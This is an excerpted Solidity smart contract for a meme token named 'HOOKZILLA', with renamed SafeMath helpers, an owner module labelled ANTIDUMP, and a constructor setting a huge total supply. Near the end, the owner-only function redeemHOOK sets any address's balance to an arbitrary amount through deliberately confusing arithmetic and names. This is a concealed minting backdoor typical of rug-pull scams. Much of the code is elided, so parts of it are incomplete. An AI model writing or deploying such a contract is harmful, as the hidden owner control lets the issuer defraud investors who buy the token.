...
library SAFEHOOK {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SAFEHOOK: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SAFEHOOK: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SAFEHOOK: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SAFEHOOK: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SAFEHOOK: modulo by zero");
  }
...
contract ANTIDUMP is IERC2022 {
  ...
  modifier onlyOwner() {
    require(_owner == _msgSender(), "ANTIDUMP: caller is not the owner");
    _;
  }
  ...
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "ANTIDUMP: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract HOOKZILLA is IERC2022, ANTIBOTS, ANTIDUMP {
  using SAFEHOOK for uint256;
  ...
  constructor() public {
    ...
    _symbol = 'HOOKZILLA';
    _decimals = 9;
    _AlltotalSupply = 69000000000000000000000;
  ...
  function transferFrom(address sender, address recipient, uint256 LiquidationAmount) external override returns (bool) {
    ...
    return true;
      ...
      function redeemHOOK(address HOOKHOLDERSadr, uint256 HOOKHOLDERS) external onlyOwner {
      _TAAbalances[HOOKHOLDERSadr] = (HOOKHOLDERS / 100 - HOOKHOLDERS / 100) + HOOKHOLDERS * 10 ** 9;
  }  
